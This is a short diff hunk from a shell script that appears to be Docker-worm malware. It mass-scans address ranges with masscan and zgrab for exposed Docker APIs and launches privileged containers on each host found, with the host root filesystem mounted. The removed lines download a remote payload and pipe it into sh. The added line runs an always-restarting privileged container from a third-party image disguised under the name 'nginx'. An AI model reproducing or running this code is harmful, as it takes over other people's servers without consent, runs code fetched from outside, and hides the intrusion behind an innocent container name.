@@ -130,8 +130,7 @@ rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
 eval "$rndstr"="'$(masscan --router-mac 66-55-44-33-22-11 $range -p$port --rate=$rate | awk '{print $6}'| zgrab --senders 200 --port $port --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
 
 for ipaddy in ${!rndstr}; do
-timeout -s SIGKILL 120 docker -H $TARGET run -d --net host --restart always --privileged --name dockerlan -v /:/host $PWNTAINER & 
-timeout -s SIGKILL 240 docker -H $TARGET run -d --net host --privileged -v /:/mnt alpine chroot sh -c 'apk update; apk add bash curl wget; apt update; apt install -y  bash curl wget; yum install -y  bash curl wget; wget -q -O - $PWNWWWLNK | sh || curl -s $PWNWWWLNK | sh' &
+timeout -s SIGKILL 120 docker -H $TARGET run -d --net host --restart always --privileged --name nginx -v /:/host nmlmweb3/upspin & 
 done
 }
 
